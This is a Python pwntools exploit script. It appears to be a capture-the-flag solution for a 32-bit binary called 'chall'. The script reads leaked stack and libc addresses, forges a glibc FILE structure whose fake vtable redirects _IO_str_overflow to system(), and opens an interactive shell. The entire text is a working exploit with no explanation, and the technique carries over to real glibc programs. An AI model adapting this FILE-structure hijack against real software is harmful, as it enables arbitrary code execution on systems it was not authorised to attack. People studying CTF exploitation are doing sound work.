from pwn import *
target=process('./chall')
libc=ELF('./chall').libc

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(_IO_read_ptr) + \
             p32(_IO_read_end) + \
             p32(_IO_read_base) + \
             p32(_IO_write_base) + \
             p32(_IO_write_ptr) + \
             p32(_IO_write_end) + \
             p32(_IO_buf_base) + \
             p32(_IO_buf_end) + \
             p32(_IO_save_base) + \
             p32(_IO_backup_base) + \
             p32(_IO_save_end) + \
             p32(_IO_marker) + \
             p32(_IO_chain) + \
             p32(_fileno)
    struct +=p32(0)*3
    struct += p32(_lock)
    struct = struct.ljust(0x94, "\x00")
    return struct

print(target.recvuntil(": "))
stack_leak=int(target.recvline().strip("\n")[:],16)
print(target.recvuntil(": "))
libc_malloc=int(target.recvline().strip("\n")[:],16)
print(target.recvuntil(": "))
libc_puts=int(target.recvline().strip("\n")[:],16)
print(target.recvuntil(": "))
libc_fread=int(target.recvline().strip("\n")[:],16)
libc_base=libc_malloc-libc.symbols["malloc"]
print(hex(stack_leak))
print(hex(libc_base))

libc_io_str_overflow_ptr=libc_base+libc.symbols["_IO_file_jumps"]+108
libc_fake_vtable=libc_io_str_overflow_ptr-8*4
rip = libc_base + libc.symbols['system']
#rdi = libc_base + next(libc.search("/bin/sh"))
rdi=stack_leak-0xc
print(target.recvline())
file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = (rdi-100)/2,
                        _IO_write_ptr = (rdi-100)/2+5,
                        _IO_write_base = 0,
                        _lock = libc_base+libc.symbols["__malloc_hook"]-0x30)
# vtable pointer
file_struct += p32(libc_fake_vtable)
# (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p32(rip)
file_struct = file_struct.ljust(0xfc, "\x00")
file_struct+="sh #"
file_struct += p32(stack_leak-4*66)
target.sendline(file_struct)

print(target.recvline())
target.interactive()


